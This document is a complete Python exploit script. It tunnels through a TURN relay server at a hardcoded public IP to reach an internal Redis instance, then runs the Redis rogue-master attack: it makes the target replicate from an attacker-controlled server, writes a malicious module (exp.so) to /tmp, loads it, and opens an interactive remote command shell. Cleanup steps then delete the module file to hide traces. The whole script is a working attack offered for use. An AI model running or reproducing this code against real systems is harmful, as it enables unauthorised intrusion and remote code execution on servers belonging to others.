#!/usr/bin/env python3
import socket
import sys
from time import sleep
from optparse import OptionParser
import binascii
import random
import select
import string

payload = open("exp.so", "rb").read()
CLRF = "\r\n"

HOST = '216.165.2.41'  # The server's hostname or IP address
PORT = 3478        # The port used by the server

CONNECTBIND_REQUEST = b'\x00\x0b'
CONNECT_REQUEST = b'\x00\x0a'
ALLOCATE_REQUEST = b'\x00\x03'
REQUESTED_TRANSPORT = b'\x00\x19'
TCP=b'\x06'
UDP=b'\x11' #17
COOKIE=b'\x21\x12\xA4\x42'
LIFETIME=b'\x00\x0D'
XOR_RELAYED_ADDRESS=b'\x00\x16'
XOR_MAPPED_ADDRESS=b'\x00\x20'
XOR_PEER_ADDRESS=b'\x00\x12'
SOFTWARE=b'\x80\x22'
CONNECTION_ID=b'\x00\x2a'

connection_id = ''

'''
https://tools.ietf.org/html/rfc6062
https://tools.ietf.org/html/rfc5766
https://tools.ietf.org/html/rfc5389
0x003  :  Allocate          (only request/response semantics defined)
0x004  :  Refresh           (only request/response semantics defined)
0x006  :  Send              (only indication semantics defined)
0x007  :  Data              (only indication semantics defined)
0x008  :  CreatePermission  (only request/response semantics defined
0x009  :  ChannelBind       (only request/response semantics defined)
0x000a :  Connect
0x000b :  ConnectionBind
0x000c :  ConnectionAttempt

STUN Attributes

0x000C: CHANNEL-NUMBER
0x000D: LIFETIME
0x0010: Reserved (was BANDWIDTH)
0x0012: XOR-PEER-ADDRESS
0x0013: DATA
0x0016: XOR-RELAYED-ADDRESS
0x0018: EVEN-PORT
0x0019: REQUESTED-TRANSPORT
0x001A: DONT-FRAGMENT
0x0021: Reserved (was TIMER-VAL)
0x0022: RESERVATION-TOKEN
0x0000: (Reserved)
0x0001: MAPPED-ADDRESS
0x0002: (Reserved; was RESPONSE-ADDRESS)
0x0003: (Reserved; was CHANGE-ADDRESS)
0x0004: (Reserved; was SOURCE-ADDRESS)
0x0005: (Reserved; was CHANGED-ADDRESS)
0x0006: USERNAME
0x0007: (Reserved; was PASSWORD)
0x0008: MESSAGE-INTEGRITY
0x0009: ERROR-CODE
0x000A: UNKNOWN-ATTRIBUTES
0x000B: (Reserved; was REFLECTED-FROM)
0x0014: REALM
0x0015: NONCE
0x0020: XOR-MAPPED-ADDRESS
0x002a :  CONNECTION-ID

Comprehension-optional range (0x8000-0xFFFF)
0x8022: SOFTWARE
0x8023: ALTERNATE-SERVER
0x8028: FINGERPRINT
'''

def build_allocate_request():

  attributes = REQUESTED_TRANSPORT
  attributes += b'\x00\x04' #length
  attributes += TCP
  attributes += b'\x00\x00\x00' #reserved?

  attributes += LIFETIME
  attributes += b'\x00\x04' # length
  attributes += b'\x00\x00\x0e\x10' # 3600

  attr_len = len(attributes)
  attr_len = attr_len.to_bytes(2, 'big')

  header = ALLOCATE_REQUEST
  header += attr_len
  header += COOKIE
  txnId = gen_tran_id()
  header += txnId
  print('generated txn id', binascii.hexlify(txnId))

  return header + attributes

def gen_tran_id():
    return binascii.unhexlify(''.join(random.choice('0123456789ABCDEF') for i in range(24)))

def xor_addr_to_ip(xor_address):
  ip1 = xor_address[0] ^ COOKIE[0]
  ip2 = xor_address[1] ^ COOKIE[1]
  ip3 = xor_address[2] ^ COOKIE[2]
  ip4 = xor_address[3] ^ COOKIE[3]
  return str(ip1) + '.' + str(ip2) + '.' + str(ip3) + '.' + str(ip4)

def build_connect_request():

  attributes = XOR_PEER_ADDRESS
  attributes += b'\x00\x08' #length
  attributes += b'\x00\x01' #ipv4 = 0x01
  attributes += b'\x39\xf9' # 6379 -hex-> 0x18eb ^ 0x2112 -> 0x39f9
  #attributes += b'\x5e\x12\xa4\x43' # 127.0.0.1 -> 0x7F000001 ^ 0x2112A442 -> 0x5e12a443
  attributes += b'\x8d\x03\xa4\x41' # 172.17.0.3
  attr_len = len(attributes)
  attr_len = attr_len.to_bytes(2, 'big')

  header = CONNECT_REQUEST
  header += attr_len
  header += COOKIE
  txnId = gen_tran_id()
  header += txnId
  print('generated txn id', binascii.hexlify(txnId))

  return header + attributes

def build_connectbind_request(connection_id):

  attributes = CONNECTION_ID
  attributes += b'\x00\x04' #length
  attributes += connection_id
  attr_len = len(attributes)
  attr_len = attr_len.to_bytes(2, 'big')

  header = CONNECTBIND_REQUEST
  header += attr_len
  header += COOKIE
  txnId = gen_tran_id()
  header += txnId
  print('generated txn id', binascii.hexlify(txnId))

  return header + attributes

def print_response(data):
  print('Message Type', data[0:2])

  msg_len = int.from_bytes(data[2:4], "big")
  print('Length', msg_len)

  cookie = data[4:8]
  print('Cookie', binascii.hexlify(cookie))

  txn_id = data[8:20]
  print('txn ID', binascii.hexlify(txn_id))

  attributes = data[20:20+msg_len]
  idx = 0
  while(idx < len(attributes)):
    attr_type = attributes[idx:idx+2]
    idx += 2
    attr_len = int.from_bytes(attributes[idx:idx+2], "big")
    idx += 2
    value = attributes[idx:idx+attr_len]
    idx += attr_len
    if (attr_type == XOR_MAPPED_ADDRESS):
      print('attibute type XOR-MAPPED-ADDRESS')
      port = value[2:4]
      port0 = (port[0] ^ COOKIE[0]).to_bytes(1, byteorder='big')
      port0 += (port[1] ^ COOKIE[1]).to_bytes(1, byteorder='big')
      print('port', int.from_bytes(port0, "big"))
      ip = xor_addr_to_ip(value[4:])
      print('ip', ip)
      print('value', binascii.hexlify(value))

    elif (attr_type == XOR_RELAYED_ADDRESS):
      print('attribute type XOR-RELAYED-ADDRESS')
      port = value[2:4]
      port0 = (port[0] ^ COOKIE[0]).to_bytes(1, byteorder='big')
      port0 += (port[1] ^ COOKIE[1]).to_bytes(1, byteorder='big')
      print('port', int.from_bytes(port0, "big"))
      ip = xor_addr_to_ip(value[4:])
      print('ip', ip)
      print('value', binascii.hexlify(value))

    elif (attr_type == LIFETIME):
      print('attribute type LIFETIME')
      print('value', int.from_bytes(value, "big"))


    elif (attr_type == SOFTWARE):
      print('attribute type SOFTWARE')
      print('value', value.decode('utf-8'))

    elif (attr_type == CONNECTION_ID):
      print('attribute type CONNECTION_ID')
      print('value', value)
      return value

    else:
      print('attribute type', binascii.hexlify(attr_type))
      print('length', attr_len)
      print('value', binascii.hexlify(value))


def mk_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd

def mk_cmd(raw_cmd):
    return mk_cmd_arr(raw_cmd.split(" "))

def din(sock, cnt):
    msg = sock.recv(cnt)
    if len(msg) < 300:
        print(f"\033[1;34;40m[->]\033[0m {msg}")
    else:
        print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
    return msg.decode('utf-8')

def dout(sock, msg):
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)
    if len(msg) < 300:
        print(f"\033[1;32;40m[<-]\033[0m {msg}")
    else:
        print(f"\033[1;32;40m[<-]\033[0m {msg[:80]}......{msg[-80:]}")

def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])

class Remote:
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        # self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # self._sock.connect((self._host, self._port))
        cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cs.connect((HOST, PORT))
        cs.sendall(build_allocate_request())
        data = cs.recv(1024)

        print('Raw Allocation Request Response', data)
        print_response(data)
        print('\n\n')

        # Connect Request
        cs.sendall(build_connect_request())
        data = cs.recv(1024)

        print('Raw Connect Request Response', data)
        connection_id = print_response(data)
        print('\n\n')

        ds = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ds.connect((HOST, PORT))
        ds.sendall(build_connectbind_request(connection_id))
        data = ds.recv(1024)

        # ConnectionBind Request
        print('Raw ConnectionBind Request Response', data)
        print_response(data)
        print('\n\n')
        self._sock = ds
        self._controlSock = cs

    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(mk_cmd(cmd))
        buf = self.recv()
        return buf

    def shell_cmd(self, cmd):
        self.send(mk_cmd_arr(['system.exec', f"{cmd}"]))
        buf = self.recv()
        return buf

class RogueServer:
    def __init__(self, lhost, lport):
        self._host = '0.0.0.0'#lhost
        self._port =  22473#lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.bind((self._host, self._port))
        self._sock.listen(10)

    def handle(self, data):
        resp = ""
        phase = 0
        if "PING" in data:
            resp = "+PONG" + CLRF
            phase = 1
        elif "REPLCONF" in data:
            resp = "+OK" + CLRF
            phase = 2
        elif "PSYNC" in data or "SYNC" in data:
            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode()
            resp += payload + CLRF.encode()
            phase = 3
        return resp, phase

    def exp(self):
        cli, addr = self._sock.accept()
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            resp, phase = self.handle(data)
            dout(cli, resp)
            if phase == 3:
                break

def interact(remote):
    try:
        while True:
            cmd = input("\033[1;32;40m[<<]\033[0m ").strip()
            if cmd == "exit":
                return
            r = remote.shell_cmd(cmd)
            for l in decode_shell_result(r).split("\n"):
                if l:
                    print("\033[1;34;40m[>>]\033[0m " + l)
    except KeyboardInterrupt:
        return

def runserver(rhost, rport, lhost, lport):
    # expolit
    remote = Remote(rhost, rport)
    remote.do(f"SLAVEOF {lhost} {lport}")
    remote.do(f"CONFIG SET DIR /tmp")
    remote.do("CONFIG SET dbfilename exp.so")
    sleep(2)
    rogue = RogueServer(lhost, lport)
    rogue.exp()
    sleep(2)
    remote.do("MODULE LOAD /tmp/exp.so")
    remote.do("SLAVEOF NO ONE")

    # Operations here
    interact(remote)

    # clean up
    remote.do("CONFIG SET dbfilename dump.rdb")
    remote.do("CONFIG SET dir /app")
    remote.shell_cmd("rm /tmp/exp.so")
    remote.do("MODULE UNLOAD system")

if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("--rhost", dest="rh", type="string",
            help="target host")
    parser.add_option("--rport", dest="rp", type="int",
            help="target redis port, default 6379", default=6379)
    parser.add_option("--lhost", dest="lh", type="string",
            help="rogue server ip")
    parser.add_option("--lport", dest="lp", type="int",
            help="rogue server listen port, default 21000", default=21000)

    (options, args) = parser.parse_args()
    if not options.rh or not options.lh:
        parser.error("Invalid arguments")
    #runserver("127.0.0.1", 6379, "127.0.0.1", 21000)
    print(f"TARGET {options.rh}:{options.rp}")
    print(f"SERVER {options.lh}:{options.lp}")
    runserver(options.rh, options.rp, options.lh, options.lp)
